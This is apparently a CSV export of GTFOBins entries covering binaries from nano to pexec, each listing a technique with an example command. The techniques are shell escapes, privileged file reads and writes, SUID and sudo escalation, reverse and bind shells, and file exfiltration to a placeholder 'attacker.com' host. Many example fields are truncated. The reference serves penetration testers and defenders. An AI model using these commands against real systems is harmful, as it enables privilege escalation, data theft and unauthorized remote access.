Binary,Function Name,Function URL,Description,Example
nano,File read,https://gtfobins.github.io/gtfobins/nano/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",nano file_to_read
nano,Sudo,https://gtfobins.github.io/gtfobins/nano/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nano,Limited SUID,https://gtfobins.github.io/gtfobins/nano/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
nasm,File read,https://gtfobins.github.io/gtfobins/nasm/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nasm -@ $LFILE"
nasm,SUID,https://gtfobins.github.io/gtfobins/nasm/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nasm,Sudo,https://gtfobins.github.io/gtfobins/nasm/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nawk,Shell,https://gtfobins.github.io/gtfobins/nawk/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"nawk 'BEGIN {system(""/bin/sh"")}'"
nawk,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/nawk/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
nawk,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/nawk/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
nawk,File write,https://gtfobins.github.io/gtfobins/nawk/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
nawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'"
nawk,File read,https://gtfobins.github.io/gtfobins/nawk/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nawk '//' ""$LFILE"""
nawk,SUID,https://gtfobins.github.io/gtfobins/nawk/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nawk,Sudo,https://gtfobins.github.io/gtfobins/nawk/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nawk,Limited SUID,https://gtfobins.github.io/gtfobins/nawk/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
nc,Reverse shell,https://gtfobins.github.io/gtfobins/nc/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
nc,Bind shell,https://gtfobins.github.io/gtfobins/nc/#bind-shell,It can bind a shell to a local port to allow remote network access.,nc target.com 12345
nc,File upload,https://gtfobins.github.io/gtfobins/nc/#file-upload,It can exfiltrate files on the network.,"nc -l -p 12345 > ""file_to_save"""
nc,File download,https://gtfobins.github.io/gtfobins/nc/#file-download,It can download remote files.,"nc target.com 12345 < ""file_to_send"""
nc,Sudo,https://gtfobins.github.io/gtfobins/nc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nc,Limited SUID,https://gtfobins.github.io/gtfobins/nc/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
ncdu,Shell,https://gtfobins.github.io/gtfobins/ncdu/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ncdu
b"
ncdu,Sudo,https://gtfobins.github.io/gtfobins/ncdu/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ncdu,Limited SUID,https://gtfobins.github.io/gtfobins/ncdu/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
ncftp,Shell,https://gtfobins.github.io/gtfobins/ncftp/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ncftp
!/bin/sh"
ncftp,SUID,https://gtfobins.github.io/gtfobins/ncftp/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ncftp,Sudo,https://gtfobins.github.io/gtfobins/ncftp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
neofetch,Shell,https://gtfobins.github.io/gtfobins/neofetch/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'exec /bin/sh' >$TF
neofetch --config $TF"
neofetch,File read,https://gtfobins.github.io/gtfobins/neofetch/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
neofetch --ascii $LFILE"
neofetch,Sudo,https://gtfobins.github.io/gtfobins/neofetch/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nft,File read,https://gtfobins.github.io/gtfobins/nft/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nft -f ""$LFILE"""
nft,SUID,https://gtfobins.github.io/gtfobins/nft/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nft,Sudo,https://gtfobins.github.io/gtfobins/nft/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nice,Shell,https://gtfobins.github.io/gtfobins/nice/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,nice /bin/sh
nice,SUID,https://gtfobins.github.io/gtfobins/nice/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nice,Sudo,https://gtfobins.github.io/gtfobins/nice/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nl,File read,https://gtfobins.github.io/gtfobins/nl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nl -bn -w1 -s '' $LFILE"
nl,SUID,https://gtfobins.github.io/gtfobins/nl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nl,Sudo,https://gtfobins.github.io/gtfobins/nl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nm,File read,https://gtfobins.github.io/gtfobins/nm/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nm @$LFILE"
nm,SUID,https://gtfobins.github.io/gtfobins/nm/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nm,Sudo,https://gtfobins.github.io/gtfobins/nm/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nmap,Shell,https://gtfobins.github.io/gtfobins/nmap/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'os.execute(""/bin/sh"")' > $TF
nmap --script=$TF"
nmap,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/nmap/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
nmap,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/nmap/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
nmap,File upload,https://gtfobins.github.io/gtfobins/nmap/#file-upload,It can exfiltrate files on the network.,"RHOST=attacker.com
RPORT=8080
LFILE=file_to_send
nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE"
nmap,File download,https://gtfobins.github.io/gtfobins/nmap/#file-download,It can download remote files.,php -S 0.0.0.0:8080
nmap,File write,https://gtfobins.github.io/gtfobins/nmap/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","TF=$(mktemp)
echo 'local f=io.open(""file_to_write"", ""wb""); f:write(""data""); io.close(f);' > $TF
nmap --script=$TF"
nmap,File read,https://gtfobins.github.io/gtfobins/nmap/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","TF=$(mktemp)
echo 'local f=io.open(""file_to_read"", ""rb""); print(f:read(""*a"")); io.close(f);' > $TF
nmap --script=$TF"
nmap,SUID,https://gtfobins.github.io/gtfobins/nmap/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nmap,Sudo,https://gtfobins.github.io/gtfobins/nmap/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nmap,Limited SUID,https://gtfobins.github.io/gtfobins/nmap/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
node,Shell,https://gtfobins.github.io/gtfobins/node/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'"
node,Reverse shell,https://gtfobins.github.io/gtfobins/node/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
node,Bind shell,https://gtfobins.github.io/gtfobins/node/#bind-shell,It can bind a shell to a local port to allow remote network access.,nc target.com 12345
node,File upload,https://gtfobins.github.io/gtfobins/node/#file-upload,It can exfiltrate files on the network.,"export URL=http://attacker.com
export LFILE=file_to_send
node -e 'require(""fs"").createReadStream(process.env.LFILE).pipe(require(""http"").request(process.env.URL))'"
node,File download,https://gtfobins.github.io/gtfobins/node/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
node -e 'require(""http"").get(process.env.URL, res => res.pipe(require(""fs"").createWriteStream(process.env.LFILE)))'"
node,File write,https://gtfobins.github.io/gtfobins/node/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","node -e 'require(""fs"").writeFileSync(""file_to_write"", ""DATA"")'"
node,File read,https://gtfobins.github.io/gtfobins/node/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","node -e 'process.stdout.write(require(""fs"").readFileSync(""/bin/ls""))'"
node,SUID,https://gtfobins.github.io/gtfobins/node/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
node,Sudo,https://gtfobins.github.io/gtfobins/node/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
node,Capabilities,https://gtfobins.github.io/gtfobins/node/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
nohup,Shell,https://gtfobins.github.io/gtfobins/nohup/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"nohup /bin/sh -c ""sh <$(tty) >$(tty) 2>$(tty)"""
nohup,Command,https://gtfobins.github.io/gtfobins/nohup/#command,It can be used to break out from restricted environments by running non-interactive system commands.,"COMMAND='/usr/bin/id'
nohup ""$COMMAND""
cat nohup.out"
nohup,SUID,https://gtfobins.github.io/gtfobins/nohup/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
nohup,Sudo,https://gtfobins.github.io/gtfobins/nohup/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
npm,Shell,https://gtfobins.github.io/gtfobins/npm/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,npm exec /bin/sh
npm,Sudo,https://gtfobins.github.io/gtfobins/npm/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nroff,Shell,https://gtfobins.github.io/gtfobins/nroff/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp -d)
echo '#!/bin/sh' > $TF/groff
echo '/bin/sh' >> $TF/groff
chmod +x $TF/groff
GROFF_BIN_PATH=$TF nroff"
nroff,File read,https://gtfobins.github.io/gtfobins/nroff/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
nroff $LFILE"
nroff,Sudo,https://gtfobins.github.io/gtfobins/nroff/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
nsenter,Shell,https://gtfobins.github.io/gtfobins/nsenter/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,nsenter /bin/sh
nsenter,Sudo,https://gtfobins.github.io/gtfobins/nsenter/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ntpdate,File read,https://gtfobins.github.io/gtfobins/ntpdate/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
ntpdate -a x -k $LFILE -d localhost"
ntpdate,SUID,https://gtfobins.github.io/gtfobins/ntpdate/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ntpdate,Sudo,https://gtfobins.github.io/gtfobins/ntpdate/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
octave,Shell,https://gtfobins.github.io/gtfobins/octave/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"octave-cli --eval 'system(""/bin/sh"")'"
octave,File write,https://gtfobins.github.io/gtfobins/octave/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","octave-cli --eval 'filename = ""file_to_write""; fid = fopen(filename, ""w""); fputs(fid, ""DATA""); fclose(fid);'"
octave,File read,https://gtfobins.github.io/gtfobins/octave/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","octave-cli --eval 'format none; fid = fopen(""file_to_read""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"
octave,Sudo,https://gtfobins.github.io/gtfobins/octave/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
octave,Limited SUID,https://gtfobins.github.io/gtfobins/octave/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
od,File read,https://gtfobins.github.io/gtfobins/od/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
od -An -c -w9999 ""$LFILE"""
od,SUID,https://gtfobins.github.io/gtfobins/od/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
od,Sudo,https://gtfobins.github.io/gtfobins/od/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
openssl,Reverse shell,https://gtfobins.github.io/gtfobins/openssl/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
openssl,File upload,https://gtfobins.github.io/gtfobins/openssl/#file-upload,It can exfiltrate files on the network.,"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save"
openssl,File download,https://gtfobins.github.io/gtfobins/openssl/#file-download,It can download remote files.,"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send"
openssl,File write,https://gtfobins.github.io/gtfobins/openssl/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
echo DATA | openssl enc -out ""$LFILE"""
openssl,File read,https://gtfobins.github.io/gtfobins/openssl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
openssl enc -in ""$LFILE"""
openssl,Library load,https://gtfobins.github.io/gtfobins/openssl/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,openssl req -engine ./lib.so
openssl,SUID,https://gtfobins.github.io/gtfobins/openssl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
openssl,Sudo,https://gtfobins.github.io/gtfobins/openssl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
openvpn,Shell,https://gtfobins.github.io/gtfobins/openvpn/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
openvpn,File read,https://gtfobins.github.io/gtfobins/openvpn/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
openvpn --config ""$LFILE"""
openvpn,SUID,https://gtfobins.github.io/gtfobins/openvpn/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
openvpn,Sudo,https://gtfobins.github.io/gtfobins/openvpn/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
openvt,Sudo,https://gtfobins.github.io/gtfobins/openvt/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
opkg,Sudo,https://gtfobins.github.io/gtfobins/opkg/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pandoc,Shell,https://gtfobins.github.io/gtfobins/pandoc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,lua
pandoc,File write,https://gtfobins.github.io/gtfobins/pandoc/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
echo DATA | pandoc -t plain -o ""$LFILE"""
pandoc,File read,https://gtfobins.github.io/gtfobins/pandoc/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
pandoc -t plain ""$LFILE"""
pandoc,SUID,https://gtfobins.github.io/gtfobins/pandoc/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
pandoc,Sudo,https://gtfobins.github.io/gtfobins/pandoc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pandoc,Limited SUID,https://gtfobins.github.io/gtfobins/pandoc/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
paste,File read,https://gtfobins.github.io/gtfobins/paste/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
paste $LFILE"
paste,SUID,https://gtfobins.github.io/gtfobins/paste/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
paste,Sudo,https://gtfobins.github.io/gtfobins/paste/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pax,File read,https://gtfobins.github.io/gtfobins/pax/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",tar
pdb,Shell,https://gtfobins.github.io/gtfobins/pdb/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'import os; os.system(""/bin/sh"")' > $TF
pdb $TF
cont"
pdb,Sudo,https://gtfobins.github.io/gtfobins/pdb/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pdflatex,Shell,https://gtfobins.github.io/gtfobins/pdflatex/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
pdflatex,File read,https://gtfobins.github.io/gtfobins/pdflatex/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
pdftotext article.pdf -"
pdflatex,Sudo,https://gtfobins.github.io/gtfobins/pdflatex/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pdflatex,Limited SUID,https://gtfobins.github.io/gtfobins/pdflatex/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
pdftex,Shell,https://gtfobins.github.io/gtfobins/pdftex/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,pdftex --shell-escape '\write18{/bin/sh}\end'
pdftex,Sudo,https://gtfobins.github.io/gtfobins/pdftex/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pdftex,Limited SUID,https://gtfobins.github.io/gtfobins/pdftex/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
perf,Shell,https://gtfobins.github.io/gtfobins/perf/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,perf stat /bin/sh
perf,SUID,https://gtfobins.github.io/gtfobins/perf/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
perf,Sudo,https://gtfobins.github.io/gtfobins/perf/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
perl,Shell,https://gtfobins.github.io/gtfobins/perl/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"perl -e 'exec ""/bin/sh"";'"
perl,Reverse shell,https://gtfobins.github.io/gtfobins/perl/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
perl,File read,https://gtfobins.github.io/gtfobins/perl/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
perl -ne print $LFILE"
perl,SUID,https://gtfobins.github.io/gtfobins/perl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
perl,Sudo,https://gtfobins.github.io/gtfobins/perl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
perl,Capabilities,https://gtfobins.github.io/gtfobins/perl/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
perlbug,Shell,https://gtfobins.github.io/gtfobins/perlbug/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'
perlbug,Sudo,https://gtfobins.github.io/gtfobins/perlbug/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pexec,Shell,https://gtfobins.github.io/gtfobins/pexec/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,pexec /bin/sh
pexec,SUID,https://gtfobins.github.io/gtfobins/pexec/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
pexec,Sudo,https://gtfobins.github.io/gtfobins/pexec/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
